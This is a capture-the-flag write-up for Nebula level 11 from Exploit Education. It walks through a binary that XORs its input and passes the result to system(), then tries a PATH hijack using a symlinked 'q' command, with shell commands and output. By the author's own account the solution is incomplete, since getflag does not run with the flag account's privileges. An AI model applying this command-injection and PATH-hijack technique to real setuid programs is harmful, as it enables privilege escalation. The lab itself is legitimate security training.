### [Exploit Education Level 11](https://exploit.education/nebula/level-11/)

## Challenge
The `/home/flag11/flag11` binary processes standard input and executes a `shell command`.
There are two ways of completing this level, you may wish to do both :-)
To do this level, log in as the `level11` account with the password `level11`. Files for this level can be found in `/home/flag11`.

The binary accepts an input from the user and if the input contains the header `Content-length: ` it takes the number 
after the header and does a check.

```cpp
if(length < sizeof(buf)) {
if(fread(buf, length, 1, stdin) != length) {
err(1, "fread length");
}
process(buf, length);
}
```

If the size is less than `1024` it accepts further input and once the length has reached calls process.

The level can be completed in 2 ways. First way is when is length is less than `1024`.

## Vulnerabilty
The vulnerability is in the function `process`
```cpp
void process(char *buffer, int length)
{
  unsigned int key;
  int i;

  key = length & 0xff;

  for(i = 0; i < length; i++) {
      buffer[i] ^= key;
      key -= buffer[i];
  }

  system(buffer);
}
```
The process `xor`s the data and then calls system.
Lets try running the program few times.  
`test` contains the letter `q`
```bash
level11@nebula:/home/flag11$ ./flag11 < /home/level11/test
sh: q: command not found
level11@nebula:/home/flag11$ ./flag11 < /home/level11/test
sh: q: command not found
level11@nebula:/home/flag11$ ./flag11 < /home/level11/test
sh: $'qP\312': command not found
level11@nebula:/home/flag11$ ./flag11 < /home/level11/test
sh: $'q\360\342': command not found
level11@nebula:/home/flag11$ ./flag11 < /home/level11/test
sh: q: command not found
level11@nebula:/home/flag11$ ./flag11 < /home/level11/test
sh: -c: line 0: unexpected EOF while looking for matching ``'
sh: -c: line 1: syntax error: unexpected end of file
level11@nebula:/home/flag11$ cd /home/level11
```
We can see that the program is trying to execute the command `q` but the encryption is changing it into something 
else. But we can see a repeating pattern. Sometimes the program is encrypting `q` as `q`
```bash
level11@nebula:/home/flag11$ ./flag11 < /home/level11/test
sh: q: command not found
```
We can use this. If we create a program named `q` and add a `symlink` we can execute any program.
## Solution
```bash
level11@nebula:~$ touch q
level11@nebula:~$ which getflag
/bin/getflag
level11@nebula:~$ ln -s /bin/getflag q
level11@nebula:~$ PATH=/home/level11/:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
level11@nebula:~$ q
getflag is executing on a non-flag account, this doesn't count
```
Okay so now `q` points to `getflag`
Lets try running the program again
```bash
level11@nebula:/home/flag11$ ./flag11 < /home/level11/test
sh: $'q\240\200': command not found
level11@nebula:/home/flag11$ ./flag11 < /home/level11/test
sh: -c: line 0: unexpected EOF while looking for matching `"'
sh: -c: line 1: syntax error: unexpected end of file
level11@nebula:/home/flag11$ ./flag11 < /home/level11/test
sh: $'q\360A': command not found
level11@nebula:/home/flag11$ ./flag11 < /home/level11/test
sh: $'q\200\377': command not found
level11@nebula:/home/flag11$ ./flag11 < /home/level11/test
getflag is executing on a non-flag account, this doesn't count
```
We successfully executed `getflag` but its saying its being executed by a non flag account.
But our program has `setuid`. So I assume that there is any error in the program.  
I haven't figured out the second method yet.
### Kinda Solved!
